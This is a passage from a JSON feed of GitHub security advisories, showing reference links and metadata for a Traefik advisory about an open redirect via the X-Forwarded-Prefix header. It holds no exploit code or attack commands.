href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09\">https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/traefik/traefik/v2/pkg/api] Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header",
            "date_modified": "2022-08-04T20:56:23.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}